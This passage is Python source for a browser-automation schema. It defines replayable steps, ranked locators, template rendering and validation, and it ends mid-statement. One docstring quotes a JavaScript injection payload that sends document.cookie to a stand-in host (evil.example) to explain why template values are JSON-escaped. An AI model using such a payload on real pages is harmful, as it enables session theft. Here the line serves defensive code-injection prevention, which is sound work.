"""The ``UseCase`` schema -- a recorded run, distilled into something replayable.

This is the contract between the three phases. Distillation writes it, the
executor reads it, and the review UI edits it, so the validation here is doing
real work: it is the last point at which a malformed or unsafe use case can be
rejected before it runs a thousand times unattended.

Three structural decisions, each forced by a requirement rather than chosen for
elegance:

**Steps are split three ways.** A batch shares one browser session, so sign-in
must not run once per row. ``setup_steps`` run once per session, ``row_steps``
run once per input row, and ``row_reset`` puts the browser back to a known
state in between. A flat list cannot express that.

**Locators are a ranked list, not a selector.** A recorded CSS selector rots
the first time the site ships a redesign. ``role`` + accessible name resolved
against a *live* snapshot survives markup churn, so it leads the list and the
recorded selectors follow as fallbacks.

**Templating is confined to what is matched as a plain string.** ``{{input.x}}``
in a CSS selector would be a selector-injection hole, so the validator refuses
it there. It is *allowed* in an accessible name, a label, a placeholder, alt
text and a text filter, because Playwright compares those as strings and a
value has no syntax to escape into -- and because a search whose dropdown is
filled from the row has no replayable locator without it. See
:data:`TEMPLATABLE_LOCATOR_FIELDS`.
"""

from __future__ import annotations

import json
import re
import uuid
from datetime import datetime, timezone
from typing import Any, Iterable, Literal
from urllib.parse import parse_qsl, urlparse, urlunparse

from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator

#: Bumped when a change to this file would make an older stored definition
#: invalid. Stored definitions carry the version they were written under.
SCHEMA_VERSION = 1

#: ``{{input.name}}`` / ``{{secret.name}}`` / ``{{env.name}}``. Whitespace
#: inside the braces is tolerated because humans edit these by hand.
TEMPLATE_RE = re.compile(r"\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}")

Action = Literal[
    "navigate", "click", "fill", "fill_form", "select", "press",
    "hover", "upload", "download", "wait", "assert", "extract", "extract_rows",
    "script",
]

#: Actions that cannot be performed without knowing which element to act on.
#:
#: ``press`` and ``upload`` are deliberately absent. ``browser_press_key`` takes
#: only a key and sends it to whatever has focus, and ``browser_file_upload``
#: takes only paths and answers whichever file chooser is open -- neither is
#: ever recorded with a target. Requiring one made a recording containing an
#: Enter keypress impossible to distil at all.
ELEMENT_ACTIONS: frozenset[str] = frozenset(
    {"click", "fill", "select", "hover", "extract", "extract_rows", "download"}
)

#: Actions that may carry a locator but work fine without one.
OPTIONAL_LOCATOR_ACTIONS: frozenset[str] = frozenset({"press", "upload"})

Status = Literal["draft", "ready", "archived"]

#: How much a model is allowed to do while this use case runs.
#:
#: ``strict`` follows the recorded steps and cannot reach a model at all --
#: ``engine.py`` does not import ``llm``, so this is a property of the code
#: rather than a setting. ``guided`` runs exactly the same way until a step
#: stops matching, at which point one budgeted call re-finds the control and
#: the plan resumes; a row where nothing breaks costs nothing.
#:
#: ``explore`` works each row out from the page and the task, with no plan to
#: follow. It costs a model call per decision, per row -- four thousand rows is
#: four thousand times -- so it is the mode this product argues against, offers
#: honestly, and always shows a price for.
Mode = Literal["strict", "guided", "explore"]

#: Who produced this document. Recorded so a reviewer knows what they are
#: looking at, and so the two authoring paths can be told apart in a list.
AuthoredBy = Literal["person", "agent"]
FailureMode = Literal["abort", "continue", "heal"]


#: Spelled out, because an escaped newline inside a nested f-string in this
#: file has been got wrong twice.
NEWLINE = "\n"


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def template_refs(value: Any) -> set[tuple[str, str]]:
    """Every ``(kind, name)`` referenced by templates anywhere in ``value``."""
    found: set[tuple[str, str]] = set()
    if isinstance(value, str):
        found.update(TEMPLATE_RE.findall(value))
    elif isinstance(value, dict):
        for key, item in value.items():
            found |= template_refs(key) | template_refs(item)
    elif isinstance(value, (list, tuple)):
        for item in value:
            found |= template_refs(item)
    return found


def has_template(value: Any) -> bool:
    return bool(template_refs(value))



class TargetMissing(ValueError):
    """A use case named a target this deployment has no address for."""


def resolve_base_url(
    *,
    target: str,
    targets: dict[str, str],
    recorded: str,
    override: str = "",
) -> str:
    """Which site this run points at, in one place.

    Three sources, most specific first:

    1. **An override given when the run was started.** For a one-off against a
       branch deployment or a customer's own tenant, where standing
       configuration would be ceremony for a single run.
    2. **The target this use case names**, looked up in this deployment's own
       targets. The ordinary path: the definition says *which* site, the
       deployment says *where* that site is, and promoting a use case moves no
       address at all.
    3. **The URL recorded into the definition.** What makes a single-environment
       install work with nothing configured: record it, run it.

    A named target with no address here is an error rather than a fallback.
    Quietly dropping to the recorded URL would send a use case promoted to
    production at whatever host it happened to be recorded against, which is
    the exact accident this arrangement exists to prevent -- and it would do it
    silently, on a run somebody had every reason to trust.
    """
    if override:
        return override.rstrip("/")
    if target:
        found = targets.get(target)
        if not found:
            known = ", ".join(sorted(targets)) or "(none defined)"
            raise TargetMissing(
                f"This use case runs against the target {target!r}, and this "
                f"deployment has no address for it. Targets defined here: {known}. "
                f"Either add a target called {target!r} under Targets, or point this "
                f"use case at one that already exists -- the target is on the use "
                f"case's own screen, beside Pace. A single run can also be given an "
                f"explicit address when it is started."
            )
        return found.rstrip("/")
    return recorded.rstrip("/")


def effective_mode(mode: "Mode | None", *, healing_enabled: bool) -> "Mode":
    """What this use case actually does here, given what the deployment allows.

    The deployment setting is a **ceiling, not a decision**. An operator who
    turned healing off across an installation meant it, and a document arriving
    from another environment must not be able to switch it back on -- so
    ``healing_enabled=False`` answers ``strict`` whatever the document says.

    Under that ceiling the document decides, and ``None`` means it never got
    the chance: it was written before the field existed. Answering ``guided``
    there is what keeps an upgrade from quietly changing how a published use
    case behaves, because ``REPLAY_HEALING_ENABLED`` was the whole decision
    until now.
    """
    if not healing_enabled:
        return "strict"
    return mode if mode is not None else "guided"


def runs_a_model_per_row(mode: "Mode | None", *, healing_enabled: bool) -> bool:
    """Whether every row of a batch in this mode will cost money.

    Asked before a batch starts, so an estimate can be shown. Strict cannot
    spend anything; Guided spends only on the rows that break, which is
    usually none; Explore spends on all of them.
    """
    return effective_mode(mode, healing_enabled=healing_enabled) == "explore"


class MissingValue(KeyError):
    """A template referenced an input or secret that was not supplied."""


def render_template(value: Any, *, inputs: dict[str, Any], secrets: dict[str, Any],
                    env: dict[str, Any] | None = None) -> Any:
    """Substitute templates through a string or a nested structure.

    Strict: an unsupplied reference raises rather than rendering an empty
    string. Silently typing "" into a login form and reporting success is the
    single worst failure mode a batch can have.
    """
    if isinstance(value, str):
        sources = {"input": inputs, "secret": secrets, "env": env or {}}

        def substitute(match: re.Match[str]) -> str:
            kind, name = match.group(1), match.group(2)
            source = sources[kind]
            if name not in source:
                raise MissingValue(f"{kind}.{name}")
            rendered = source[name]
            return "" if rendered is None else str(rendered)

        return TEMPLATE_RE.sub(substitute, value)
    if isinstance(value, dict):
        return {k: render_template(v, inputs=inputs, secrets=secrets, env=env)
                for k, v in value.items()}
    if isinstance(value, list):
        return [render_template(v, inputs=inputs, secrets=secrets, env=env) for v in value]
    return value


#: One pattern for both spellings a template can have inside JavaScript:
#: quoted (``page.fill('#name', '{{input.x}}')``) or bare
#: (``const n = {{input.x}};``).
#:
#: They are matched together, in one alternation, so that a single pass over
#: the source handles both. Two passes would rescan the first pass's output --
#: see render_code for why that is a security bug and not just untidy.
_CODE_TEMPLATE_RE = re.compile(
    # Quoted form first: the backreference requires the *same* quote to close,
    # so the whole literal is consumed and replaced by one JSON literal rather
    # than leaving the original quotes wrapped around it.
    r"""(['"`])\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}\1"""
    r"""|\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}"""
)


def render_code(
    code: str,
    *,
    inputs: dict[str, Any],
    secrets: dict[str, Any],
    env: dict[str, Any] | None = None,
) -> str:
    """Substitute templates into JavaScript source, safely.

    Two distinct hazards, and the second is easy to miss.

    **Splicing raw values into source is code injection.** This is why
    :func:`render_template` cannot be used here: it puts the value where the
    template was, which is right for a form field and wrong for JavaScript. A
    value of::

        '); fetch('https://evil.example/'+document.cookie); ('

    would close the string literal it sits in and run what follows. The values
    come from a spreadsheet somebody may have assembled with no idea it reaches
    a browser, so this is a real path. Each value is therefore emitted as a
    JSON literal: ``json.dumps`` escapes quotes, backslashes and newlines, and
    ``ensure_ascii`` turns U+2028/U+2029 into escapes, which JavaScript would
    otherwise read as line terminators.

    **Substituting twice re-expands the values.** ``re.sub`` does not rescan
    what it inserted, but a *second* ``sub`` call scans the first one's output.
    An earlier version of this function ran one pass for quoted templates and
    another for bare ones, so an input whose value was the text
    ``{{secret.password}}`` had that value substituted and then expanded --
    rendering the real credential into the page. A row of batch input could
    read any secret bound to the run.

    Hence one pattern and one pass. What a value contains is data, and stays
    data.
    """
    sources = {"input": inputs, "secret": secrets, "env": env or {}}

    def literal(kind: str, name: str) -> str:
        source = sources[kind]
        if name not in source:
            raise MissingValue(f"{kind}.{name}")
        value = source[name]
        return json.dumps("" if value is None else str(value), ensure_ascii=True)

    def replace(match: re.Match[str]) -> str:
        # Groups 1-3 are the quoted alternative, 4-5 the bare one.
        if match.group(2) is not None:
            return literal(match.group(2), match.group(3))
        return literal(match.group(4), match.group(5))

    return _CODE_TEMPLATE_RE.sub(replace, code)


# ---------------------------------------------------------------------------
# Leaf models
# ---------------------------------------------------------------------------


#: Strategies that carry a single string in ``text`` rather than a field of
#: their own. They exist because ``playwright codegen`` emits them, and each
#: maps to exactly one Playwright call -- which is the point: a recorded rung
#: should be a thing the browser knows how to find, not a thing this code has
#: to reinterpret.
STRING_STRATEGIES = frozenset({"text", "label", "placeholder", "test_id", "alt_text"})

#: Rungs that describe an element by what it *means* rather than by where it
#: sits or what it is called in the markup. These survive a redesign, so a
#: ladder is built with them first.
SEMANTIC_STRATEGIES = frozenset({"role", "label", "placeholder", "alt_text"})

#: Strategies that match by a *name* and so have a loose and a strict reading
#: of it. Playwright's ``exact`` parameter exists on exactly these calls;
#: ``get_by_test_id`` matches an attribute and has no such thing, and ``css``
#: and ``nth`` are not names at all.
NAMED_STRATEGIES = frozenset({"role", "label", "placeholder", "alt_text", "text"})

#: Locator fields a ``{{input.x}}`` may appear in, and the two it may not.
#:
#: The rule used to be "never, anywhere in a locator", for two reasons. One
#: still holds completely and one turned out to be about *which field*.
#:
#: **Injection.** A templated CSS selector is a selector-injection hole: the
#: value is spliced into a query language, and a row whose spreadsheet cell
#: reads ``a, button`` addresses every link on the page. That argument is
#: exactly as strong as it ever was for ``selector`` and ``frames``, which are
#: the only two fields here that *are* a query language. It does not transfer
#: to the fields below: an accessible name, a label, a placeholder, alt text
#: and a text filter are matched by Playwright as plain strings, and there is
#: no syntax in them for a value to escape into.
#:
#: **Debuggability.** "When a locator stops matching you can no longer tell
#: whether the site changed or the input did." Real, and answered rather than
#: avoided: the resolver renders a rung before it describes it, so a failure
#: says what was actually looked for on that row rather than the template.
#:
#: Keeping the blanket ban cost more than it saved. A search whose dropdown is
#: filled from the row -- type a customer number, pick the customer name --
#: has *no* replayable locator without this: the recorded name belongs to the
#: row it was recorded on, and no rung available to the schema could say "the
#: name from this row's spreadsheet column".
TEMPLATABLE_LOCATOR_FIELDS = frozenset({"name", "text", "has_text"})


#: How deep ``within`` may nest. Three is already more than any real page
#: needs -- dialog, row, cell -- and a bound is what stops a hand-edited or
#: model-proposed locator from becoming a recursion that only the executor
#: discovers.
MAX_SCOPE_DEPTH = 3

#: How many frames a locator may reach through. Nested iframes exist (a widget
#: inside an embedded document); four levels of them do not.
MAX_FRAME_DEPTH = 3


class Locator(BaseModel):
    """One rung of the locator ladder.

    ``role`` is resolved against a live snapshot at replay time and is the
    durable option; the rest are recorded fallbacks in decreasing order of how
    much site churn they survive.

    ``label``, ``placeholder`` and ``alt_text`` are nearly as durable, because
    all three *are* the element's accessible name as far as a page is
    concerned -- which is why they resolve the same way ``role`` does. They
    exist as separate strategies rather than being folded into ``role``
    because ``playwright codegen`` emits them, and rewriting a recorded
    ``get_by_label`` into a role guess would be this code inventing something
    the recorder did not say.

    ``test_id`` is a contract the site's own authors maintain, so it is stable
    until they change it -- but it is markup, not meaning, and it is absent
    from most pages.

    Three fields describe *where to look* rather than *what to look for*, and
    they exist because without them this schema could not record what
    ``playwright codegen`` already writes:

    ``within`` scopes the search inside another element. This is the standard
    answer to two controls with the same name -- the "Invite" button in the
    dialog, not the "Invite" link in the sidebar -- and until it existed the
    only recourse was ``nth``, which is a guess about ordering, or refusing
    the step as ambiguous. A recording that names a scope is *narrower* than
    one that does not, so a scoped rung leads its unscoped twin.

    ``has_text`` keeps only matches containing some text. It is how a row is
    picked out of a table: ``role=row`` filtered by the customer's name, then
    the button inside it.

    ``frames`` is the chain of iframes to descend through, outermost first,
    each a CSS selector for the frame element. An element inside an iframe is
    unreachable without this -- not merely harder to find, absent from the
    page as far as every other rung is concerned.
    """

    model_config = ConfigDict(extra="forbid")

    strategy: Literal["role", "label", "placeholder", "test_id", "alt_text", "css", "text", "nth"]
    #: strategy="role"
    role: str | None = None
    name: str | None = None
    #: Whether the recorded name must be the element's *whole* accessible name.
    #:
    #: Playwright matches a name as a case-insensitive substring unless told
    #: otherwise, so a button recorded as "Invite" also matches "+ Invite
    #: User". Codegen writes ``exact=True`` when it needs to tell two such
    #: controls apart; carrying it is therefore not an optimisation but the
    #: difference between the recorded element and a different one.
    exact: bool = False
    #: Disambiguates when several nodes share role+name, and indexes `nth`.
    nth: int = 0
    #: strategy="css"
    selector: str | None = None
    #: The string for every strategy in :data:`STRING_STRATEGIES`.
    text: str | None = None

    #: Search inside this element rather than the whole page. Recursive, so a
    #: button in a cell in a row is expressible; bounded by
    #: :data:`MAX_SCOPE_DEPTH` so a malformed one is rejected here rather than
    #: found by the executor.
    within: "Locator | None" = None
    #: Keep only matches whose text contains this.
    has_text: str | None = None
    #: iframes to descend through, outermost first, as CSS selectors.
    frames: list[str] = Field(default_factory=list)

    @model_validator(mode="after")
    def _requires_its_own_field(self) -> "Locator":
        if self.strategy in STRING_STRATEGIES:
            required = "text"
        else:
            required = {"role": "role", "css": "selector", "nth": None}[self.strategy]
        if required and not getattr(self, required):
            raise ValueError(f"locator strategy {self.strategy!r} requires {required!r}")
        if self.strategy == "nth" and self.nth < 0:
            raise ValueError("locator strategy 'nth' requires a non-negative nth")
        return self

    @model_validator(mode="after")
    def _scope_is_bounded(self) -> "Locator":
        """A scope chain has a depth limit, and only the outermost rung
        carries the frames.

        Both halves matter for the same reason: ``_build`` walks this
        structure and composes one Playwright call per level. A chain with no
        bound, or with a frame hop buried three levels in, is a shape the
        executor would have to interpret rather than perform.
        """
        if len(self.frames) > MAX_FRAME_DEPTH:
            raise ValueError(
                f"a locator may reach through at most {MAX_FRAME_DEPTH} frames, not "
                f"{len(self.frames)}"
            )
        if any(not frame.strip() for frame in self.frames):
            raise ValueError("a frame in 'frames' cannot be blank")

        depth, scope = 0, self.within
        while scope is not None:
            depth += 1
            if depth > MAX_SCOPE_DEPTH:
                raise ValueError(
                    f"a locator may be scoped at most {MAX_SCOPE_DEPTH} levels deep"
                )
            if scope.frames:
                raise ValueError(
                    "only the outermost locator carries 'frames'; a scope inside it is "
                    "already in that frame"
                )
            scope = scope.within
        return self

    @property
    def matches_on_text(self) -> bool:
        """Whether this rung finds its element *by* what the element says.

        The question `Step.expect_text` needs answered. A rung that matched on
        an accessible name has already proved the wording; one that matched a
        CSS path, a test id or a bare role has proved only that something sits
        in that position, and that is the rung that lands on a different
        control after a redesign without anybody noticing.

        `NAMED_STRATEGIES` rather than `STRING_STRATEGIES`, because `test_id`
        is in the second and is not text a person reads -- a test id survives
        the control behind it being replaced, which is the whole point of one.
        """
        value = self.name if self.strategy == "role" else self.text
        if self.has_text:
            return True
        return self.strategy in NAMED_STRATEGIES and bool(value)

    @property
    def semantic(self) -> bool:
        """Whether this rung describes meaning rather than markup.

        The whole chain has to qualify, not just the rung's own strategy. A
        role scoped inside a CSS selector breaks when the markup changes, so
        ordering it ahead of an unscoped role rung would put the more fragile
        of the two first -- which is the one thing the ladder's ordering
        exists to prevent.
        """
        if self.strategy not in SEMANTIC_STRATEGIES:
            return False
        return self.within is None or self.within.semantic

    @property
    def scoped(self) -> bool:
        """Whether this rung narrows the search at all.

        Read by the ladder: between two rungs that are otherwise equal, the
        one that says *where* is the one the recording was more specific
        about, and it goes first.
        """
        return self.within is not None or bool(self.has_text) or bool(self.frames)

    def templated_selector(self) -> str:
        """Which CSS-bearing field of this chain holds a template, or "".

        Walks the scope chain, because ``within`` is where a templated selector
        would most easily hide: the rung a reviewer reads says ``role=button``
        and the thing it is scoped inside is the injection.
        """
        if has_template(self.selector):
            return "selector"
        if has_template(self.frames):
            return "frames"
        return self.within.templated_selector() if self.within is not None else ""

    def template_values(self) -> list[str]:
        """Every string of this chain a template may legitimately appear in.

        What :meth:`Step.references` counts, so an input named only by a
        locator is still a declared input. A step that finds its element by
        ``{{input.customer_name}}`` and does not declare that input would
        otherwise pass review and then look for the literal text on every row.
        """
        mine = [self.name or "", self.text or "", self.has_text or ""]
        return mine + (self.within.template_values() if self.within is not None else [])

    def render(self, render: Any) -> "Locator":
        """This rung with ``{{input.x}}`` made real, through ``render``.

        Returns ``self`` unchanged when there is nothing to substitute, which
        is every rung of every recording made before templating was allowed
        here -- so the common path allocates nothing.
        """
        if not has_template(self.template_values()):
            return self
        update: dict[str, Any] = {}
        for field in TEMPLATABLE_LOCATOR_FIELDS:
            value = getattr(self, field)
            if value and has_template(value):
                update[field] = render(value)
        if self.within is not None:
            update["within"] = self.within.render(render)
        return self.model_copy(update=update)

    def describe(self) -> str:
        if self.strategy == "role":
            base = f'role={self.role}' + (f' name="{self.name}"' if self.name else "")
        elif self.strategy == "css":
            base = f"css={self.selector}"
        elif self.strategy in STRING_STRATEGIES:
            base = f"{self.strategy}={self.text!r}"
        else:
            base = f"nth={self.nth}"
        if self.exact and self.strategy in NAMED_STRATEGIES:
            base += " exact"
        if self.has_text:
            base += f" has_text={self.has_text!r}"
        if self.nth != 0 and self.strategy != "nth":
            base += f" [{self.nth}]"
        if self.within is not None:
            base = f"{base} in {self.within.describe()}"
        if self.frames:
            base = f"{base} in frame {' > '.join(self.frames)}"
        return base


#: ``within`` refers to ``Locator`` from inside its own body. Pydantic can
#: usually work that out unaided; saying so explicitly means a failure to
#: resolve it is an import error here rather than a validation error on the
#: first use case someone edits.
Locator.model_rebuild()


class Assertion(BaseModel):
    """A check the executor evaluates locally -- no model, no judgement."""

    model_config = ConfigDict(extra="forbid")

    kind: Literal[
        "url_contains",
        "text_present",
        "element_visible",
        "element_count",
        "title_contains",
        "attribute_contains",
    ]
    value: str | None = None
    #: element_count only.
    count: int | None = None
    #: attribute_contains only: which attribute to read.
    #:
    #: The gap this fills, found by reading what other recorders can check:
    #: the identifier a later step needs is often in a link rather than in the
    #: words a person sees, so "the row's link points at account A-1001" was a
    #: check nothing here could express. `extract` could already *read* an
    #: attribute; only asserting on one was missing.
    attribute: str = Field(default="", max_length=100)
    locator: Locator | None = None
    negate: bool = False
    timeout_ms: int = Field(default=10_000, ge=0, le=300_000)

    @model_validator(mode="after")
    def _requires_a_subject(self) -> "Assertion":
        if self.kind in {"url_contains", "text_present", "title_contains"} and not self.value:
            raise ValueError(f"assertion {self.kind!r} requires a value")
        if self.kind in {"element_visible", "element_count"} and self.locator is None:
            raise ValueError(f"assertion {self.kind!r} requires a locator")
        if self.kind == "element_count" and self.count is None:
            raise ValueError("assertion 'element_count' requires a count")
        if self.kind == "attribute_contains":
            if self.locator is None:
                raise ValueError("assertion 'attribute_contains' requires a locator")
            if not self.attribute:
                raise ValueError(
                    "assertion 'attribute_contains' requires an attribute to read"
                )
            if not self.value:
                raise ValueError("assertion 'attribute_contains' requires a value")
        return self

    def render(self, render: Any) -> "Assertion":
        """This check with ``{{input.x}}`` made real, through ``render``.

        The same shape as `Locator.render`, and needed for the same reason: a
        check about the record being processed is the obvious thing to write.
        `Step.references` has always counted an assertion's value as a real
        template reference, so the schema said this worked -- while the
        executor compared the template text against the page, where it could
        never hold. Rendering before evaluating also means a failure names the
        value the row actually looked for rather than the template.

        Returns ``self`` when there is nothing to substitute, which is every
        check of every recording that does not use one.
        """
        rendered_value = (
            render(self.value) if self.value and has_template(self.value) else self.value
        )
        rendered_locator = self.locator.render(render) if self.locator is not None else None
        if rendered_value == self.value and rendered_locator is self.locator:
            return self
        return self.model_copy(
            update={"value": rendered_value, "locator": rendered_locator}
        )

    def unsatisfiable_reason(self, allowed_domains: list[str]) -> str | None:
        """Why this assertion can never hold, or ``None`` if it might.

        The domain allowlist is enforced on every navigation, so it bounds
        where the browser can possibly be -- which makes some URL assertions
        provably false before anything runs. Catching those is worth doing
        deterministically: an assertion that cannot pass turns every row of a
        batch into a failure, and the failure message blames the page rather
        than the assertion.

        Deliberately conservative. It only reports a contradiction it can
        actually prove, because wrongly discarding a real check would remove
        the only thing standing between a batch and silent success.
        """
        if self.kind != "url_contains" or not self.value:
            return None

        domains = [
            d.strip().lower().removeprefix("*.")
            for d in allowed_domains
            if d and d.strip() and d.strip() != "*"
        ]
        # No allowlist, or a wildcard: the browser could be anywhere.
        if not domains or len(domains) != len([d for d in allowed_domains if d and d.strip()]):
            return None

        value = self.value.strip().lower()

        if self.negate:
            # "the URL must NOT contain X", where X is part of every domain the
            # run is allowed to reach. The allowlist forbids being anywhere else.
            if all(value in domain for domain in domains):
                return (
                    f"asserts the URL does NOT contain {self.value!r}, but this use case is "
                    f"restricted to {', '.join(allowed_domains)} -- so every page it can "
                    "reach contains that text and the check can never pass"
                )
            return None

        # "the URL must contain X", where X names a host that is not reachable.
        # Only applied when the value looks like a hostname, so a path check
        # like "/signin" is never touched.
        looks_like_host = "." in value and "/" not in value and " " not in value
        if looks_like_host and not any(
            value in domain or domain in value for domain in domains
        ):
            return (
                f"asserts the URL contains {self.value!r}, which is not among the domains "
                f"this use case may visit ({', '.join(allowed_domains)})"
            )
        return None

    def describe(self) -> str:
        body = {
            "url_contains": f"URL contains {self.value!r}",
            "title_contains": f"title contains {self.value!r}",
            "text_present": f"page shows {self.value!r}",
            "element_visible": f"{self.locator.describe() if self.locator else '?'} is visible",
            "element_count": f"{self.locator.describe() if self.locator else '?'} appears {self.count} time(s)",
            "attribute_contains": (
                f"{self.locator.describe() if self.locator else '?'} has "
                f"{self.attribute}={self.value!r}"
            ),
        }[self.kind]
        return f"NOT {body}" if self.negate else body


class WaitFor(BaseModel):
    model_config = ConfigDict(extra="forbid")

    kind: Literal["time", "text", "text_gone", "load_state"]
    value: str | None = None
    seconds: float | None = Field(default=None, ge=0, le=120)
    state: Literal["load", "domcontentloaded", "networkidle"] | None = None
    timeout_ms: int = Field(default=15_000, ge=0, le=300_000)



class ExtractColumn(BaseModel):
    """One field to read out of each row of a list.

    ``selector`` is CSS, scoped **inside** the row, and that is deliberate
    rather than a shortcut. The semantic locators the rest of this schema
    prefers -- role, label, placeholder -- identify one element on a page; they
    do not address "the third cell of this row". A list page is structural, so
    the locator for a column is structural too. The row locator above it can
    still be semantic, and usually should be.

    ``attribute`` reads an attribute instead of the text. This is what makes
    discovery work at all: the identifier you need is almost never the visible
    label, it is the ``href`` of the link wrapping it.
    """

    model_config = ConfigDict(extra="forbid")

    name: str = Field(min_length=1, max_length=64)
    selector: str = Field(min_length=1, max_length=500)
    #: Empty reads the element's text.
    attribute: str = Field(default="", max_length=64)


class FormField(BaseModel):
    """One field of a ``fill_form`` batch."""

    model_config = ConfigDict(extra="forbid")

    name: str
    value: str = ""
    type: str = "textbox"
    locators: list[Locator] = Field(default_factory=list)


class InputSpec(BaseModel):
    model_config = ConfigDict(extra="forbid")

    name: str = Field(pattern=r"^[A-Za-z_][A-Za-z0-9_]*$")
    type: Literal["string", "url", "number", "boolean", "file"] = "string"
    required: bool = True
    default: Any = None
    description: str = ""
    example: str = ""


class SecretSpec(BaseModel):
    """A credential slot. Only ever a *name* -- values live in the vault."""

    model_config = ConfigDict(extra="forbid")

    name: str = Field(pattern=r"^[A-Za-z_][A-Za-z0-9_]*$")
    required: bool = True
    description: str = ""


# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------


class Step(BaseModel):
    model_config = ConfigDict(extra="forbid", populate_by_name=True)

    id: str = Field(default_factory=lambda: f"s{uuid.uuid4().hex[:6]}")
    action: Action
    #: Human-readable, shown in the timeline and in failure messages.
    description: str = ""

    locators: list[Locator] = Field(default_factory=list)
    #: navigate
    url: str | None = None
    #: fill / select / press / upload
    value: str | None = None
    #: fill_form
    fields: list[FormField] = Field(default_factory=list)
    #: extract_rows -- what to read out of each row the locator matches.
    columns: list[ExtractColumn] = Field(default_factory=list)
    #: extract -- read this attribute rather than the element's text. An href
    #: is the usual reason: the identifier a later pass needs is in the link,
    #: not in the words a person sees.
    attribute: str = ""
    #: extract -- the key this step's value lands under in the row's outputs.
    output: str | None = None
    #: script -- raw JavaScript. Refused unless the use case opts in.
    code: str | None = None

    assertion: Assertion | None = Field(default=None, alias="assert")
    wait_for: WaitFor | None = None

    #: Run this step only when this holds. ``None`` means always.
    #:
    #: The gap a person hits within a day of using this: a cookie banner that
    #: is there on the first row and not the fourth, a dialog that appears
    #: only for some records, a save button that only exists when something
    #: changed. `optional` covers "failing is survivable", which is a
    #: different statement -- an optional step still runs, still waits out its
    #: timeout, and still reports a failure somebody has to read.
    #:
    #: An `Assertion` rather than an expression, deliberately. It is the same
    #: check the executor already evaluates locally with no model and no
    #: judgement, it is reviewable on the same screen as everything else, and
    #: there is nothing in it to execute. A `when` with an expression language
    #: in it would be a script step wearing a smaller name.
    when: Assertion | None = None

    #: What the element this step acts on said when it was recorded.
    #:
    #: Checked before acting, and *only* when the rung that matched does not
    #: itself match on text -- see `Locator.matches_on_text`. A rung that found
    #: its element by accessible name has already proved the wording; a CSS
    #: path, a test id or a bare role has proved only that something sits in
    #: that position. Those are the rungs that quietly land on a different
    #: control, and a step that "succeeds" against the wrong control is the
    #: worst outcome this system has -- it gets recorded as a success and does
    #: the wrong thing on every row.
    #:
    #: Borrowed from how other recorders validate a cached locator: before
    #: trusting a stored path, check the element there still says what it said.
    #: The comparison is deliberately lenient, containment either way rather
    #: than equality, because a wrapper's text includes its children's and an
    #: exact match would refuse correct steps.
    expect_text: str = Field(default="", max_length=200)

    optional: bool = False
    on_failure: FailureMode = "abort"
    timeout_ms: int = Field(default=30_000, ge=0, le=300_000)

    #: Locator rungs the recorder saw fail. Kept for the review UI so a person
    #: can see what was tried, never executed.
    rejected_locators: list[Locator] = Field(default_factory=list)

    #: What this step is *for*, in the recorder's own words.
    #:
    #: `description` is a rendering of the locator -- "click role=button
    #: name='Save'" -- which says what the step does mechanically and nothing
    #: about why. Healing and repair were being asked "which of these forty
    #: controls resembles a link named Billing" when the answerable question is
    #: "which of these opens the customer's billing tab". This is that
    #: question's other half.
    #:
    #: It already existed and was being thrown away. The authoring agent must
    #: write one sentence before every tool call saying what it sees, what it
    #: expects the call to do and how it will know -- `agent/session.py`'s
    #: `observation` -- and distillation dropped it on the floor.
    #:
    #: Evidence, never executed, like `recorded_page`. It says what to look
    #: for; it can never authorise a control that is not among the candidates
    #: a repair is offered, and the prompts say so.
    intent: str = Field(default="", max_length=1_000)

    #: The page this step was recorded against, as an accessibility tree.
    #:
    #: Never executed, and never read by the engine. It exists for the one
    #: question a repair cannot otherwise answer: a locator stopped matching,
    #: and the only evidence available was the page as it is *now*. Choosing a
    #: replacement from that alone is guessing which of forty controls somebody
    #: meant. With the page as it was, the two can be compared, and "this
    #: control was here and is not any more" has one answer rather than forty.
    #:
    #: Capped by whoever writes it (see `agent/session.py`). Travels with the
    #: definition rather than living in its own table, because a use case
    #: promoted to another environment should carry its own evidence -- a
    #: repair in UAT is done by somebody who was not there when it was
    #: recorded in dev.
    recorded_page: str = Field(default="", max_length=20_000)

    @model_validator(mode="after")
    def _action_has_what_it_needs(self) -> "Step":
        if self.action in ELEMENT_ACTIONS and not self.locators:
            raise ValueError(f"step {self.id!r}: action {self.action!r} requires at least one locator")
        if self.action == "navigate" and not self.url:
            raise ValueError(f"step {self.id!r}: 'navigate' requires a url")
        if self.action == "assert" and self.assertion is None:
            raise ValueError(f"step {self.id!r}: 'assert' requires an assertion")
        if self.action == "extract" and not self.output:
            raise ValueError(f"step {self.id!r}: 'extract' requires an output name")
        if self.action == "script" and not self.code:
            raise ValueError(f"step {self.id!r}: 'script' requires code")
        if self.action == "fill_form" and not self.fields:
            raise ValueError(f"step {self.id!r}: 'fill_form' requires at least one field")
        if self.action == "extract_rows" and not self.columns:
            raise ValueError(
                f"step {self.id!r}: 'extract_rows' requires at least one column. "
                "Without one it would find the rows and read nothing out of them."
            )
        if self.action == "download" and not self.output:
            raise ValueError(
                f"step {self.id!r}: 'download' requires an output name. The file is the "
                "point of the step, and the name is how a later row finds it."
            )
        if self.action == "extract_rows" and not self.output:
            raise ValueError(
                f"step {self.id!r}: 'extract_rows' requires an output name to land under"
            )
        if self.action == "wait" and self.wait_for is None:
            raise ValueError(f"step {self.id!r}: 'wait' requires wait_for")
        if self.action == "press" and not self.value:
            raise ValueError(f"step {self.id!r}: 'press' requires a key")
        if self.action == "upload" and not self.value:
            raise ValueError(f"step {self.id!r}: 'upload' requires a file path")
        return self

    @model_validator(mode="after")
    def _selectors_are_never_templated(self) -> "Step":
        """A templated *selector* is a selector-injection hole.

        A templated accessible name is not, and the difference is which of them
        is a query language -- see :data:`TEMPLATABLE_LOCATOR_FIELDS` for the
        whole argument. ``selector`` and ``frames`` are CSS and stay closed;
        the fields Playwright matches as plain strings are open, because a
        search whose dropdown is filled from the row has no replayable locator
        without them.
        """
        everywhere = [
            *self.locators,
            *self.rejected_locators,
            *[loc for field in self.fields for loc in field.locators],
        ]
        for locator in everywhere:
            offending = locator.templated_selector()
            if offending:
                raise ValueError(
                    f"step {self.id!r}: templating is not allowed in a locator's "
